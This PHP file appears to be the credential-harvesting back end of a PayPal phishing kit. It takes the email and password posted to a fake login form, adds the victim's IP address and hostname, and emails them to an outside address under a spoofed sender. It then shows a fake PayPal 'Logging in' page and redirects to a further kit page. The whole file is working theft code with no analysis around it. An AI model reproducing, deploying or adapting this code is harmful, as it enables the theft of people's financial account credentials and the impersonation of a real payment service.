<?php

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message  = "====================+ PaYPal CWX +=====================\n";
$message .= "Email        : ".$_POST['01D']."\n\n";
$message .= "Password     : ".$_POST['02D']."\n\n";
$message .= "===================\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "=====================+ CyberXPloit  +==================\n";
$rnessage = "$message\n";
$send= "rsaccount1991@live.com";
$subject = "Login | Paypal | $ip";
$headers = "From: PayPalCWX<cwxnetwork@exploit.net>";

$str=array($send, $IWP); foreach ($str as $send)
if(mail($send,$subject,$rnessage,$headers) != false){
mail($Send,$subject,$rnessage,$headers);

}
?>
<!DOCTYPE HTML5>
<html>
<head>
<META HTTP-EQUIV="Refresh" CONTENT="05; URL=information.html"> 
<meta charset="utf-8">
<title>Logging in - PayPal</title>
<link href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico" rel="icon">
</head>
<body>


        <div id="wrapper">
		<center>
		<h3>One moment...</h3>
		
		<img class="ajax" src="images/ajax.gif">
		
		<p>Still loading after a few seconds? <a href="information.html">Try Again</a></p>
		</center>
		
		</div>
</body>
</html>